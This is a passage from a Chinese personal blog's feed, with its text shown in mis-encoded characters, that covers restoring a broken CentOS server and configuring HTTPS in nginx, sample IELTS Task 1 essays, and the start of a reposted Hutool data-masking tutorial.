title="é”™æŠŠç‰ˆæœ¬å‡çº§"></a>é”™æŠŠç‰ˆæœ¬å‡çº§</h3><p>æœ€è¿‘é˜¿é‡Œäº‘æ˜¾ç¤ºæˆ‘çš„åšå®¢ç½‘ç«™æœ‰æ¼æ´,æˆ‘ä¾¿æƒ³ç€å»æŠŠå®ƒç»™ä¿®äº†,ç”±äºç»éªŒä¸è¶³ä¸”æ²¡æœ‰è®¤çœŸçœ‹å®˜æ–¹çš„è§£å†³æ–¹æ¡ˆ,æˆ‘æŠŠcentosä»ç‰ˆæœ¬7ç›´æ¥å‡åˆ°äº†ç‰ˆæœ¬8,å¯¼è‡´åšå®¢ç½‘ç«™æŒ‚äº†,æœåŠ¡ä¸å¯ç”¨.ç”±äºæ˜¯å¤§ç‰ˆæœ¬å‡çº§,è€Œä¸”ä¹‹å‰ä¹Ÿé”™è¯¯å‡çº§äº†ä¸€äº›ä¸œè¥¿,äºæ˜¯æˆ‘é€‰æ‹©äº†é‡ç½®ç¯å¢ƒç„¶åé‡æ–°éƒ¨ç½².äº‹åæƒ³äº†ä¸€ä¸‹,ä¸»è¦é—®é¢˜æœ‰ä¸¤ç‚¹:</p><ol><li>æ²¡æœ‰ä»”ç»†çœ‹å®˜æ–¹çš„è§£å†³æ–¹æ¡ˆ,ä½¿ç”¨äº†æ›´å®½èŒƒå›´çš„updateå‘½ä»¤,å¯¼è‡´centoså’Œä¸€äº›ç»„ä»¶é”™è¯¯å‡çº§,ä»è€Œå¯¼è‡´åšå®¢ç½‘ç«™æ— æ³•æ­£å¸¸è®¿é—®.</li><li>æ²¡æœ‰å¤‡ä»½æ‰‹æ®µ,é˜¿é‡Œäº‘å…¶å®æä¾›äº†å¿«ç…§,ä½†æˆ‘ä»¥ä¸ºè‡ªå·±ä¸ä¼šç”¨ä¸Š,è€Œä¸”èƒ½çœä¸€ç¬”é’±,ä¹Ÿå°±æ²¡å¼€é€š</li></ol><p>é˜¿é‡Œäº‘é‡ç½®ç¯å¢ƒçš„æ–¹æ³•:</p><ol><li><p>åœæ­¢äº‘æœåŠ¡å™¨<br><img src="https://pb01.s3.bitiful.net/144.png" alt="avatar"></p></li><li><p>æ‰¾åˆ°æ›´æ¢æ“ä½œç³»ç»Ÿé€‰é¡¹,é€‰æ‹©æ›´æ¢ç³»ç»Ÿç›˜<br><img src="https://pb01.s3.bitiful.net/145.png" alt="avatar"></p></li><li><p>å¯¹ç³»ç»Ÿç›˜åšåˆå§‹è®¾ç½®<br><img src="https://pb01.s3.bitiful.net/146.png" alt="avatar"></p></li></ol><h3 id="åšå®¢ç½‘ç«™æ— æ³•æ­£å¸¸è®¿é—®"><a href="#åšå®¢ç½‘ç«™æ— æ³•æ­£å¸¸è®¿é—®" class="headerlink" title="åšå®¢ç½‘ç«™æ— æ³•æ­£å¸¸è®¿é—®"></a>åšå®¢ç½‘ç«™æ— æ³•æ­£å¸¸è®¿é—®</h3><p>è¿™ä¸ªé—®é¢˜åœ¨äºæµè§ˆå™¨,æˆ‘ä¸€ç›´æ²¡æœ‰ç»™æˆ‘çš„ç½‘ç«™é…ç½®SSLè¯ä¹¦,æ‰€ä»¥ä¸€ç›´ç”¨çš„æ˜¯httpåè®®,ç°åœ¨edgeæµè§ˆå™¨å’Œchromeæµè§ˆå™¨å·²ç»å¼ºåˆ¶å°†httpè½¬æ¢ä¸ºhttps,å¯¼è‡´æˆ‘çš„ç½‘ç«™æ— æ³•æ­£å¸¸è®¿é—®.è§£å†³æ–¹æ¡ˆæœ‰å¦‚ä¸‹ä¸¤ç§:</p><h4 id="1-æ›´æ”¹HSTS"><a href="#1-æ›´æ”¹HSTS" class="headerlink" title="1.æ›´æ”¹HSTS"></a>1.æ›´æ”¹HSTS</h4><p>åœ¨edgeæµè§ˆå™¨ä¸­,è¾“å…¥edge://net-internals/#hsts,åœ¨Delete domain sercurity policiesä¸­è¾“å…¥é¡¹ç›®çš„åŸŸåï¼Œå¹¶Delete,ç„¶åé‡æ–°è®¿é—®ç½‘ç«™å³å¯.chromeæµè§ˆå™¨è¾“å…¥chrome://net-internals/#hstså³å¯.</p><p><img src="https://pb01.s3.bitiful.net/147.png" alt="avatar"></p><h4 id="2-é…ç½®SSLè¯ä¹¦"><a href="#2-é…ç½®SSLè¯ä¹¦" class="headerlink" title="2.é…ç½®SSLè¯ä¹¦"></a>2.é…ç½®SSLè¯ä¹¦</h4><p>ä¹‹å‰æ²¡é…ç½®SSLè¯ä¹¦çš„åŸå› æ˜¯è§‰å¾—æ²¡å¿…è¦,æœ¬èº«ç½‘ç«™è®¿é—®é‡ä¸å¤§,èƒ½ç”¨å°±è¡Œ,ç°åœ¨éšç€æµè§ˆå™¨å®‰å…¨ç­–ç•¥çš„å‡çº§,ä¹Ÿå°±ä¸å¾—ä¸é…ç½®äº†.</p><ol><li>è´­ä¹°SSLè¯ä¹¦<br>ç”±äºé˜¿é‡Œäº‘ç°åœ¨çš„å…è´¹è¯ä¹¦åªæä¾›ä¸‰ä¸ªæœˆ,æ‰€ä»¥æˆ‘é€‰æ‹©äº†68å…ƒä¸€å¹´çš„è¯ä¹¦</li></ol><p><img src="https://pb01.s3.bitiful.net/148.png" alt="avatar"></p><ol><li><p>é…ç½®DNSè§£æ<br>æ ¹æ®SSLè¯ä¹¦æä¾›çš„ä¿¡æ¯æ·»åŠ ä¸€æ¡è®°å½•,ä»¥ä¾¿é€šè¿‡éªŒè¯,å½“ç„¶å¦‚æœæœåŠ¡å™¨,åŸŸåéƒ½æ˜¯é˜¿é‡Œäº‘çš„,å®ƒä¼šä¸ºä½ è‡ªåŠ¨æ·»åŠ ,ä½†ä¼šæœ‰ç‚¹æ…¢.<br><img src="https://pb01.s3.bitiful.net/153.png" alt="avatar"></p></li><li><p>è¯ä¹¦ä¸‹è½½<br>æˆ‘æ˜¯ä¸‹è½½Nginxçš„è¯ä¹¦<br><img src="https://pb01.s3.bitiful.net/150.png" alt="avatar"><br>ç„¶åå°†ä¸‹è½½ä¸‹æ¥çš„keyå’Œpemæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š,å¯ä»¥ä¸æŒ‰æˆ‘çš„æ“ä½œæ¥<br><img src="https://pb01.s3.bitiful.net/149.png" alt="avatar"></p></li></ol><p>æˆ‘çš„æ“ä½œå¦‚ä¸‹:åœ¨æœåŠ¡å™¨æ–°å»ºä¸€ä¸ªSSLæ–‡ä»¶å¤¹ï¼Œå°†ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/</span><br><span class="line"><span class="built_in">mkdir</span> SSL</span><br></pre></td></tr></table></figure></p><ol><li>é…ç½®nginx<br>è¿™é‡Œéœ€è¦ä¿®æ”¹nginx.confæ–‡ä»¶,æ·»åŠ httpsåè®®çš„é…ç½®<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/</span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure></li></ol><p>è¿›å…¥åæ‰¾åˆ°serverå—,ç›‘å¬443ç«¯å£çš„é‚£ä¸ª,80çš„é‚£ä¸ªæ˜¯httpåè®®çš„é…ç½®,å¯ä»¥æ³¨é‡Šæ‰,ä¹Ÿå¯ä»¥ä¿ç•™(<strong>è®°å¾—æ£€æŸ¥443ç«¯å£æ˜¯å¦æ‰“å¼€</strong>).<br><img src="https://pb01.s3.bitiful.net/151.png" alt="avatar"></p><p>å°†å…¶å–æ¶ˆæ³¨é‡Š,å°†rootæ”¹ä¸ºåšå®¢æ ¹ç›®å½•,æŠŠpemæ–‡ä»¶å’Œkeyæ›¿æ¢ä¸Šå»,å¦‚æœä¸‹è½½çš„ä¸æ˜¯Nginxçš„è¯ä¹¦,å¯èƒ½éœ€è¦ä¿®æ”¹ä¸€ä¸‹,è‡ªå·±æ³¨æ„å°±å¥½<br><img src="https://pb01.s3.bitiful.net/152.png" alt="avatar"></p><ol><li><p>é‡å¯NginxæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx.service</span><br></pre></td></tr></table></figure><p>çœ‹NginxæœåŠ¡æ˜¯å¦æ­£å¸¸å¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx.service</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æ˜¯å¦æˆåŠŸ<br>ä½¿ç”¨httpsåè®®è®¿é—®ä½ çš„ç½‘ç«™,å¦‚æœå‡ºç°äº†é”çš„æ ‡è¯†,å°±ä»£è¡¨é…ç½®æˆåŠŸ.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTSä¼˜ç§€å°ä½œæ–‡åˆ†äº«</title>
      <link href="/2024/02/29/2024-2-29-IELTS%E5%B0%8F%E4%BD%9C%E6%96%87%E5%88%86%E4%BA%AB/"/>
      <url>/2024/02/29/2024-2-29-IELTS%E5%B0%8F%E4%BD%9C%E6%96%87%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="IELTSä¼˜ç§€å°ä½œæ–‡åˆ†äº«"><a href="#IELTSä¼˜ç§€å°ä½œæ–‡åˆ†äº«" class="headerlink" title="IELTSä¼˜ç§€å°ä½œæ–‡åˆ†äº«"></a>IELTSä¼˜ç§€å°ä½œæ–‡åˆ†äº«</h3><h4 id="æŸ±çŠ¶å›¾"><a href="#æŸ±çŠ¶å›¾" class="headerlink" title="æŸ±çŠ¶å›¾"></a>æŸ±çŠ¶å›¾</h4><p>æœ¬ç¯‡èŒƒæ–‡ä¸ªäººè¯„åˆ†æ˜¯8åˆ†æˆ–è€…8.5åˆ†ï¼Œå±äºèƒ½æ‰¾åˆ°çš„æœ€ä¼˜è´¨çš„èŒƒæ–‡äº†</p><p><strong>é¢˜ç›®å¦‚ä¸‹</strong>:<br><img src="https://pb01.s3.bitiful.net/122.jpg" alt="avatar"></p><p>The two sets of bar charts illustrate the amount of time that teenagers (boys, girls, and all) in the UK spend chatting online and playing game consoles on a typical school day.</p><p>The first set of data shows the behavioral patterns of chatting on the internet: on average, about 25% of teenager students, including both boys and girls, spend less than one hour, around 30% between one to three, and approximately 6% more than four hours. As for the two gender groups, while a slightly larger proportion of girls tend to spend more daily time chatting online, the data are still comparable to that of the boys.</p><p>In comparison, game consoles is a totally different story as the behavioral pattens are significantly different between the two gender groups. About 30% of the boys and more than a third of the girls spend less than one hour on games, while almost half of the boys and only 12% of girls spend between one to three hours. Last but not least, 10% of the boys and almost no girls spend more than four hours of their daily time on games. It is also worth noticing that the â€œAllâ€ group simply reflects the average of the two genders but does not seem to be an accurate representation of either.</p><p>In conclusion, boys and girls behave slightly differently when chatting online, but significantly differently when it comes to playing game consoles.</p><h4 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h4><p>å‰‘æ¡¥é›…æ€7çš„Test 1é‡Œçš„å°ä½œæ–‡</p><p><img src="https://pb01.s3.bitiful.net/160.png" alt="avatar"></p><p>è¿™ä¸€ç¯‡æ˜¯Simonä¹¦é‡Œçš„èŒƒæ–‡, æˆ‘ç¨å¾®åšäº†ç‚¹æ”¹å˜, ä»–è¯´ä»–çš„èŒƒæ–‡èƒ½å¾—9åˆ†, ä½†æˆ‘æ„Ÿè§‰è¿™æ ·çš„æ–‡ç« æ”¾åˆ°è€ƒè¯•æœ€å¤š7.5, å¤§æ¦‚ç‡6.5/7</p><p>The table shows percentages of consumer expenditure for three categories of products and services in five countries in 2002.</p><p>It is clear that the largest proportion of consumer spending in each country went on food, drinks and tobacco.    On the other hand, the leisure/education category has the lowest percentages in the table.</p><p>Among the five countries, consumer spending on food, drinks and tobacco was noticeably the highest in Turkey, at 32.14% and Ireland spent the second highest amount, less than 30%.   The proportion of spending on leisure and education was also highest in Turkey, at 4.35%, while expenditure on clothing and footwear was significantly higher in Italy, at 9%, than in any of the other countries.</p><p>It can be seen that Sweden had the lowest percentage of national consumer expenditure for food/drinks/tobacco and for clothing/footwear, at nearly 16% and just over 5% respectively.    Spain had slightly higher figures for these categories, but the lowest figure for leisure/education, at only 1.98%.</p><p>è¿™ç¯‡çš„æ€è·¯æ˜¯ä»ç±»åˆ«æ¥åˆ†æ,ä¸Šé¢é‚£ç¯‡ä»å›½å®¶æ¥åˆ†æ,è§†è§’ä¸åŒ,è¿™ç¯‡å¤§çº¦6/6.5</p><p>The table compares 5 distinctive countries with regard to their citizensâ€™ expenditure on Food/Drinks/Tobacco, Clothing/Footwear and Leisure/ Education in the year of 2002.</p><p>Overall, it can be seen that consumers in the five nations spent more on Food/Drinks/Tobacco than the other categories. It is also noticeable that Leisure/ Education took up the least proportion in 2002.</p><p>In terms of the expenditure on Food/Drinks/Tobacco, Turkish consumers ranked the first with a percentage of 32.14% in 2002, followed by individuals from Ireland (28.91%) and Spain (18.80%). By contrast, citizens in Italy and Sweden spent less money on this category, respectively 16.36% and 15.77%.</p><p>When it comes to Clothing/Footwear, the figure for Italy was 9%, significantly higher than its counterparts, which represented merely around 6%. Moreover, the spending on Leisure/ Education accounted for the least percentage in these categories. The largest amount, namely 4.35% could be found for Turkey, which was more than twice as high as the figure for Spain(1.98%). The rate of Sweden, Italy and Ireland lied separately in 3.22%, 3.20% and 2.21%.</p><h4 id="é¥¼å›¾"><a href="#é¥¼å›¾" class="headerlink" title="é¥¼å›¾"></a>é¥¼å›¾</h4><p>C14 Test 1,ä¸ªäººè§‰å¾—è¿™ç¯‡å†™å¾—éå¸¸æ ‡å‡†,æ‰€ä»¥åº”è¯¥æœ‰6.5-7.0çš„æ°´å‡†å§</p><p><img src="https://pb01.s3.bitiful.net/161.png" alt="avatar"></p><p>The pie charts compare three types of nutrients, namely sodium, saturated fat and added sugar with regard to their average proportions in Americansâ€™ meals.</p><p>Overall, it can be seen that breakfast contains the lowest rate of all the three nutrients. It is also noticeable that dinner occupies the highest rate of both sodium and saturated fat, while snacks contain more added sugar than their counterparts.</p><p>In terms of sodium and saturated fat, dinner makes up the highest percentage (43% and 37% respectively) and by contrast, the figure for breakfast remains the lowest being 14% and 16% separately. Apart from that, snacks also contain the lowest proportion of sodium as breakfast both representing 14% but its percentage of saturated fat reaches 21%.</p><p>When it comes to added sugar, snacks make up the largest proportion of 42%, followed by dinner and lunch (23% and 19% for each). In breakfast, individuals in the USA take in the lowest amount of added sugar, accounting for only 16% among three meals and snacks.</p><h4 id="æŸ±çŠ¶å›¾-1"><a href="#æŸ±çŠ¶å›¾-1" class="headerlink" title="æŸ±çŠ¶å›¾"></a>æŸ±çŠ¶å›¾</h4><p>åˆ†æ•°åº”è¯¥æ˜¯8åˆ†</p><p><img src="https://pb01.s3.bitiful.net/162.png" alt="avatar"></p><p>The bar chat presents the number of research students, divided by gender, who pursed different subjects in 2005. These subjects included linguistics, psychology, natural sciences, engineering, programming and mathematics.</p><p>Overall, there were more male than female research student in the given year. Among all subjects, male students had a higher enrollment than female students except for linguistics. Although both genders took a strong interset in psychology and natural sciences, two of the most popular subjects, men least preferred linguists and women mathematics.</p><p>Female and male students showed a more or less similar interest in linguistics, psychology and natural sciences. In particular, natural sciences was the most popular of all, showing the same enrollment number of 200. Through very popular, psychology was favored more by men (200) than women (around 170). In linguistics, the situation was the reverse, with more women than men.</p><p>However, female and male students showed significant differences in engineering, programming and mathematics. In all three subject, male domiance was obvious, especially in mathematics, which was taken by 200 males students and only 40 female students in engineering and programming, the number of female syudents was roughly half of that of male.</p><h4 id="æŠ˜çº¿å›¾"><a href="#æŠ˜çº¿å›¾" class="headerlink" title="æŠ˜çº¿å›¾"></a>æŠ˜çº¿å›¾</h4><p>8åˆ†å·¦å³</p><p><img src="https://pb01.s3.bitiful.net/163.png" alt="avatar"></p><p>The line chart illustrates avrage carbon dioxide (CO2) emissions per capita in the UK, Sweden, Italy and Portugal over 40 years from 1967 to 2007. Units were measured in metric tonnes.</p><p>On the whole, the UK and Sweden showed a general decreasing trend in terms of CO2 emissions while Italy and Portugal both witnessed a stedy rising trend. Throughout this prise, the UK had the highest CO2 emissions, while Portugal remained the lowest.</p><p>In 1967, the highest CO2 emission were in the UK, at around 11, following by Sweden at appromately 9. Italy and Portugal had relatively lower emissions, at around 4 and 1 respectively. Around 1987, CO2 emissions per capita in the UK steadily droped to 10, still being the highest. In Sweden, despite the short initial increse to above 10, CO2 emissions later dropped to around 7, which was the same as those in Italy, whichh had witnessed an increase. At the same time, the average emissions of CO2 climbed to arround 3 in Portugal, remaining the lowest.</p><p>In2007, CO2 emissions continued falling in the UK, now at around 9, albeit still the highest among the four countries. Co2 emissions in Italy had been the second highest. The falling trend of CO2 emissions in Sweden continued, meeting those in Portugal at around 5.</p><h4 id="åœ°å›¾"><a href="#åœ°å›¾" class="headerlink" title="åœ°å›¾"></a>åœ°å›¾</h4><p>C18T3  6.5+çš„åˆ†æ•°</p><p>From the two diagrams provided, we can observe the changes in room layouts at the Central Library over a period of twenty years. In the past 20 years, there have been not only changes in regional functions, but also fundamental adjustments in layout.</p><p>Firstly, the room located in the top-left corner has increased in size. Previously, this room was arranged for CDs, videos and computer games, but nowadays, it is furnished with childrenâ€™s fiction books. Moreover, there are two sofas, which could provide a comfortable space for holding storytelling activities. The room in the bottom-left corner used to be a space for people to read newspapers and magazines. Nowadays, it is a computer room. Additionally, its door orientation has also been changed. In the middle area, the category of books has changed from adult fiction books to reference books.</p><p>Next, regarding the room in the top-right corner, previously it stored childrenâ€™s books. However, this function has been replaced by the room on the left and it serves as a lecture room currently. The area in the bottom-right corner was previously an enquiry desk, which provides services related to tickets, book returns and so forth, but now it has been transformed into a Cafe. In the area between those two areas mentioned above, adult fiction books, information desk and self-service machines have replaced adult non-fiction books in the past.</p><p>Finally, in terms of the central area, it previously contained tables and chairs, providing convenience for people to read. However, they have now been removed, making the library appear more spacious.</p><h4 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h4><p>C16T2  7åˆ†</p><p>The diagram sheds light on how sugar is manufactured from sugar canes.</p><p>Overall, it can be seen that the whole process consists of 7 steps, from the initial growing stage to the eventual drying and cooling stage.</p><p>The first step begins with growing sugar canes, which lasts for 12 to 18 months and is the longest stage in the whole process. Subsequently, the mature sugar canes are harvested in two means, either by hand or with the help of specialized vehicles and after that, these sugar canes are crushed into juice by certain professional machine.</p><p>The fourth step involves the purification of the juice utilizing limestone filters. Afterwards the purified juice is evaporated thanks to the heat under the machine and converts into syrup. In the next stage, sugar crystals are separated from syrup, after which these crystals are dried and cooled and eventually, sugar is produced from sugar canes.</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ• | äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ</title>
      <link href="/2024/02/26/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F/"/>
      <url>/2024/02/26/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="å£°æ˜-æœ¬æ–‡è½¬è½½è‡ªHutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ•-äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ"><a href="#å£°æ˜-æœ¬æ–‡è½¬è½½è‡ªHutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ•-äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ" class="headerlink" title="å£°æ˜:æœ¬æ–‡è½¬è½½è‡ªHutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ• | äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ"></a>å£°æ˜:æœ¬æ–‡è½¬è½½è‡ª<a href="https://segmentfault.com/a/1190000044102356" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Hutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ• | äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ</a></h4><h1 id="Hutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ•-äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ"><a href="#Hutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ•-äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ" class="headerlink" title="Hutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ• | äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ"></a>Hutoolï¼šä¸€è¡Œä»£ç æå®šæ•°æ®è„±æ• | äº¬ä¸œäº‘æŠ€æœ¯å›¢é˜Ÿ</h1><h2 id="1-ä»€ä¹ˆæ˜¯æ•°æ®è„±æ•"><a href="#1-ä»€ä¹ˆæ˜¯æ•°æ®è„±æ•" class="headerlink" title="1. ä»€ä¹ˆæ˜¯æ•°æ®è„±æ•"></a>1. ä»€ä¹ˆæ˜¯æ•°æ®è„±æ•</h2><h3 id="1-1-æ•°æ®è„±æ•çš„å®šä¹‰"><a href="#1-1-æ•°æ®è„±æ•çš„å®šä¹‰" class="headerlink" title="1.1 æ•°æ®è„±æ•çš„å®šä¹‰"></a>1.1 æ•°æ®è„±æ•çš„å®šä¹‰</h3><p>æ•°æ®è„±æ•ç™¾åº¦ç™¾ç§‘ä¸­æ˜¯è¿™æ ·å®šä¹‰çš„ï¼š</p><p>æ•°æ®è„±æ•ï¼ŒæŒ‡å¯¹æŸäº›æ•æ„Ÿä¿¡æ¯é€šè¿‡è„±æ•è§„åˆ™è¿›è¡Œæ•°æ®çš„å˜å½¢ï¼Œå®ç°æ•æ„Ÿéšç§æ•°æ®çš„å¯é ä¿æŠ¤ã€‚è¿™æ ·å°±å¯ä»¥åœ¨å¼€å‘ã€æµ‹è¯•å’Œå…¶å®ƒéç”Ÿäº§ç¯å¢ƒä»¥åŠå¤–åŒ…ç¯å¢ƒä¸­å®‰å…¨åœ°ä½¿ç”¨è„±æ•åçš„çœŸå®æ•°æ®é›†ã€‚åœ¨æ¶‰åŠå®¢æˆ·å®‰å…¨æ•°æ®æˆ–è€…ä¸€äº›å•†ä¸šæ€§æ•æ„Ÿæ•°æ®çš„æƒ…å†µä¸‹ï¼Œåœ¨ä¸è¿åç³»ç»Ÿè§„åˆ™æ¡ä»¶ä¸‹ï¼Œå¯¹çœŸå®æ•°æ®è¿›è¡Œæ”¹é€ å¹¶æä¾›æµ‹è¯•ä½¿ç”¨ï¼Œå¦‚èº«ä»½è¯å·ã€æ‰‹æœºå·ã€å¡å·ã€å®¢æˆ·å·ç­‰ä¸ªäººä¿¡æ¯éƒ½éœ€è¦è¿›è¡Œæ•°æ®è„±æ•ã€‚æ˜¯æ•°æ®åº“å®‰å…¨æŠ€æœ¯ä¹‹ä¸€ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæ•°æ®è„±æ•æ˜¯æŒ‡å¯¹æŸäº›æ•æ„Ÿä¿¡æ¯é€šè¿‡è„±æ•è§„åˆ™è¿›è¡Œæ•°æ®çš„å˜å½¢ï¼Œå®ç°æ•æ„Ÿéšç§æ•°æ®çš„å¯é ä¿æŠ¤ã€‚</p><p>åœ¨æ•°æ®è„±æ•è¿‡ç¨‹ä¸­ï¼Œé€šå¸¸ä¼šé‡‡ç”¨ä¸åŒçš„ç®—æ³•å’ŒæŠ€æœ¯ï¼Œä»¥æ ¹æ®ä¸åŒçš„éœ€æ±‚å’Œåœºæ™¯å¯¹æ•°æ®è¿›è¡Œå¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¯¹äºèº«ä»½è¯å·ç ï¼Œå¯ä»¥ä½¿ç”¨æ©ç ç®—æ³•ï¼ˆmaskingï¼‰å°†å‰å‡ ä½æ•°å­—ä¿ç•™ï¼Œå…¶ä»–ä½ç”¨â€œXâ€æˆ–â€*â€œä»£æ›¿ï¼›å¯¹äºå§“åï¼Œå¯ä»¥ä½¿ç”¨ä¼ªé€ ï¼ˆpseudonymizationï¼‰ç®—æ³•ï¼Œå°†çœŸå®å§“åæ›¿æ¢æˆéšæœºç”Ÿæˆçš„å‡åã€‚</p><h3 id="1-2-å¸¸ç”¨è„±æ•è§„åˆ™"><a href="#1-2-å¸¸ç”¨è„±æ•è§„åˆ™" class="headerlink" title="1.2 å¸¸ç”¨è„±æ•è§„åˆ™"></a>1.2 å¸¸ç”¨è„±æ•è§„åˆ™</h3><p>æ›¿æ¢ã€é‡æ’ã€åŠ å¯†ã€æˆªæ–­ã€æ©ç </p><h2 id="2-Hutoolå·¥å…·ä»‹ç»"><a href="#2-Hutoolå·¥å…·ä»‹ç»" class="headerlink" title="2. Hutoolå·¥å…·ä»‹ç»"></a>2. Hutoolå·¥å…·ä»‹ç»</h2><h3 id="2-1-å¼•å…¥Mavené…ç½®"><a href="#2-1-å¼•å…¥Mavené…ç½®" class="headerlink" title="2.1 å¼•å…¥Mavené…ç½®"></a>2.1 å¼•å…¥Mavené…ç½®</h3><p>åœ¨é¡¹ç›®çš„pom.xmlçš„dependenciesä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹ï¼Œè¿™é‡Œä»¥5.8.16ç‰ˆæœ¬ä¸ºä¾‹ã€‚<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool\-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.8.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>æ³¨æ„ï¼šHutool 5.xæ”¯æŒJDK8+ï¼Œ å¦‚æœä½ çš„é¡¹ç›®ä½¿ç”¨JDK7ï¼Œè¯·ä½¿ç”¨Hutool 4.xç‰ˆæœ¬ã€‚æœ¬æ–‡ä½¿ç”¨çš„æ•°æ®è„±æ•å·¥å…·ç±»åªæœ‰åœ¨5.6+ç‰ˆæœ¬ä»¥ä¸Šæ‰æä¾›ã€‚</p><h3 id="2-2-HutoolåŒ…å«çš„ç»„ä»¶"><a href="#2-2-HutoolåŒ…å«çš„ç»„ä»¶" class="headerlink" title="2.2 HutoolåŒ…å«çš„ç»„ä»¶"></a>2.2 HutoolåŒ…å«çš„ç»„ä»¶</h3><p>ä¸€ä¸ªJavaåŸºç¡€å·¥å…·ç±»ï¼Œå¯¹æ–‡ä»¶ã€æµã€åŠ å¯†è§£å¯†ã€è½¬ç ã€æ­£åˆ™ã€çº¿ç¨‹ã€XMLç­‰JDKæ–¹æ³•è¿›è¡Œå°è£…ï¼Œç»„æˆå„ç§Utilå·¥å…·ç±»ï¼ŒåŒæ—¶æä¾›ä»¥ä¸‹ç»„ä»¶ï¼š</p><div class="table-container"><table><thead><tr><th>æ¨¡å—</th><th>ä»‹ç»</th></tr></thead><tbody><tr><td>hutool-aop</td><td>JDKåŠ¨æ€ä»£ç†å°è£…ï¼Œæä¾›éIOCä¸‹çš„åˆ‡é¢æ”¯æŒ</td></tr><tr><td>hutool-bloomFilter</td><td>å¸ƒéš†è¿‡æ»¤ï¼Œæä¾›ä¸€äº›Hashç®—æ³•çš„å¸ƒéš†è¿‡æ»¤</td></tr><tr><td>hutool-cache</td><td>ç®€å•ç¼“å­˜å®ç°</td></tr><tr><td>hutool-core</td><td>æ ¸å¿ƒï¼ŒåŒ…æ‹¬Beanæ“ä½œã€æ—¥æœŸã€å„ç§Utilç­‰</td></tr><tr><td>hutool-cron</td><td>å®šæ—¶ä»»åŠ¡æ¨¡å—ï¼Œæä¾›ç±»Crontabè¡¨è¾¾å¼çš„å®šæ—¶ä»»åŠ¡</td></tr><tr><td>hutool-crypto</td><td>åŠ å¯†è§£å¯†æ¨¡å—ï¼Œæä¾›å¯¹ç§°ã€éå¯¹ç§°å’Œæ‘˜è¦ç®—æ³•å°è£…</td></tr><tr><td>hutool-db</td><td>JDBCå°è£…åçš„æ•°æ®æ“ä½œï¼ŒåŸºäºActiveRecordæ€æƒ³</td></tr><tr><td>hutool-dfa</td><td>åŸºäºDFAæ¨¡å‹çš„å¤šå…³é”®å­—æŸ¥æ‰¾</td></tr><tr><td>hutool-extra</td><td>æ‰©å±•æ¨¡å—ï¼Œå¯¹ç¬¬ä¸‰æ–¹å°è£…ï¼ˆæ¨¡æ¿å¼•æ“ã€é‚®ä»¶ã€Servletã€äºŒç»´ç 